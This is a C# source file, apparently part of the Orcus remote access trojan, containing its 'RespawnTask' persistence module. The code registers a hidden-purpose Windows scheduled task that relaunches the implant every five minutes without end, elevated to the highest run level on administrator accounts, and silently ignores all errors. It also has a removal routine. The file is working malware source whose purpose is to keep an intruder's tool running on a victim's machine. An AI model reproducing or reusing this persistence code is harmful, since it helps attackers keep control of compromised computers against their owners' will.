using System;
using System.Linq;
using Microsoft.Win32.TaskScheduler;
using Orcus.Config;
using Orcus.Shared.Settings;
using Orcus.Utilities;

namespace Orcus.Protection
{
    public static class RespawnTask
    {
        private static bool _isRegistered;

        public static void RegisterRespawnTask(string filename, string taskName)
        {
            if (_isRegistered)
                return;

            try
            {
                try
                {
                    TaskService.Instance.RootFolder.DeleteTask(taskName, false);
                }
                catch (Exception)
                {
                    for (int i = 1; ; i++)
                    {
                        var newName = taskName + " (" + i + ")";
                        if (
                            TaskService.Instance.RootFolder.Tasks.Any(
                                x => string.Equals(x.Name, newName, StringComparison.OrdinalIgnoreCase)))
                        {
                            try
                            {
                                TaskService.Instance.RootFolder.DeleteTask(newName, false);
                            }
                            catch (Exception)
                            {
                                continue;
                            }
                        }

                        taskName = newName;
                    }
                }

                var task = TaskService.Instance.NewTask();
                var trigger = new RegistrationTrigger();
                trigger.Repetition.Interval = TimeSpan.FromMinutes(5);
                trigger.Repetition.StopAtDurationEnd = false;
                task.Triggers.Add(trigger);
                task.Actions.Add(filename);

                if (CoreHelper.RunningOnVistaOrGreater && User.IsAdministrator)
                    task.Principal.RunLevel = TaskRunLevel.Highest;

                TaskService.Instance.RootFolder.RegisterTaskDefinition(taskName, task);
                _isRegistered = true;
            }
            catch (Exception)
            {
                // ignored / FML
            }
        }

        public static void RemoveRespawnTask()
        {
            using (var taskService = new TaskService())
            {
                taskService.RootFolder.DeleteTask(Settings.GetBuilderProperty<RespawnTaskBuilderProperty>().TaskName, false);
            }
        }
    }
}